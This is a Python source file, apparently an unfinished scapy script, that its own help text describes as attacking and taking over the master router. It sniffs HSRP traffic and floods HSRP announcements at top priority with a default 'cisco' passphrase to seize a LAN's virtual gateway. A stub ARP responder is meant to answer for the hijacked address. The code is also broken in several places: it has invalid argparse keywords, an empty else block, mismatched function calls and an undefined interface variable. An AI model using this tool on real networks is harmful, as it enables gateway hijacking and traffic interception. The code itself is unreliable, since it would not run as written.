from scapy.all import *
from argparse import ArgumentParser
import logging


"""
Constants for HSRP
"""
PORT = 1985
MULTICAST_IP = "224.0.0.2"
PRIORITY = 255
GROUP = 0
AUTH = "cisco"
VERSION = {"224.0.0.2": "1",
           "224.0.0.102": "2"}
MULTICAST_MAC = "00:01:5e:00:00:{}"
VIRTUAL_IP = "192.168.1.1"
MD5_AUTH = 0

parser = ArgumentParser(description="Attacks and takes over the master router.")
parser.add_argument("--iface", dest="iface", description="Interface to attack on. Default is eth0.", type=str)
parser.add_argument("--sniff", description="Sniff HSRP packets for 10 seconds.")
parser.add_argument("--takeover", description="Begin the takeover.")
parser.add_argument("--group", dest="grp", description="The group ID to takeover. Default is 0.", type=str)
parser.add_argument("--ip", dest="ip", description="The virtual IP to takeover. Default is 192.168.1.1", type=str)
parser.add_argument("--auth", destination="auth", description="The passphrase used for authentication. Default is cisco.")
parser.add_argument("--md5_auth", destination="md5_auth", description="Specifies whether to use md5 authentication.")
args = parser.parse_args()


def main():
    iface = "eth0"

    if args.iface:
        iface = args.iface

    if args.sniff:
        logging.info("[+] Starting sniff...")
        pkts = sniff(iface=iface, timeout=10, filter="hsrp", prn=print_hsrp)

        if not pkts:
            logging.info("[-] No HSRP packets sniffed.")
            exit(1)

        logging.info("[+] HSRP packets found.")
    elif args.takeover:
        hsrp_takeover()
        # respond_arp()


def respond_arp(virtual_ip):
    logging.info("[+] Initiating ARP responder...")
    responder = AsyncSniffer(store=False, filter="arp", prn=handle_arp)
    responder.start()

def handle_arp(pkt):
    arp_pkt = pkt[ARP]

    if arp_pkt == ARP.who_has:
        # TODO
        sendp(Ether(dst=pkt[Ether].src) / ARP(op=ARP.is_at))

def hsrp_takeover(args):
    global GROUP
    global AUTH

    logging.log("[+] Initiating HSRP takeover...")


    if not (args.grp and args.ip and args.auth):
        logging.info("Missing mandatory arguments.")
        exit(1)
    else:


    # TODO perhaps make this a thread
    flood_hsrp(args)


def flood_hsrp(grp, ip, passphrase):
    """
    Sends HSRP packets every 3 seconds.
    :param grp: group number
    :param ip: virtual ip
    :param passphrase: password used for authentication
    :return:
    """
    logging.info("[+] Starting HSRP flooding...")
    frame = Ether(dst=MULTICAST_MAC.format(grp))
    packet = IP(dst=MULTICAST_IP, ttl=1)
    segment = UDP(sport=PORT, dport=PORT)
    hsrp_layer = HSRP(group=grp, priority=PRIORITY, auth=passphrase, virtualIP=ip)

    sendp(frame/packet/segment/hsrp_layer, iface=iface, loop=1, inter=3)


def print_hsrp(pkt):
    return """
    {} \n
    HSRP version: {} \n
    Source IP: {}
    """.format(pkt[HSRP].show(), VERSION[pkt[IP].dst], pkt[IP].src)

# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    main()

